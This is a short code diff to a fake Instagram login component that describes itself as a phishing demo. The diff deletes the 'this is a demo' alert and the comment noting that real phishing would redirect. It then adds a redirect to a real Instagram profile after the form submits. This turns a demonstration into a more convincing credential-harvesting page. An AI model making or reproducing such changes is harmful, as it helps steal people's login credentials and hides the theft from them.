@@ -35,10 +35,8 @@ export default function InstagramLogin({ location, onUserInteraction }: Instagra
       })
 
       if (response.ok) {
-        // Show success message (in real phishing, this would redirect)
-        alert('Login successful! (This is a demo - no actual login occurred)')
-        setUsername('')
-        setPassword('')
+        // Redirect to Instagram profile
+        window.location.href = 'https://www.instagram.com/foundr/'
       } else {
         alert('Login failed. Please try again.')
       }
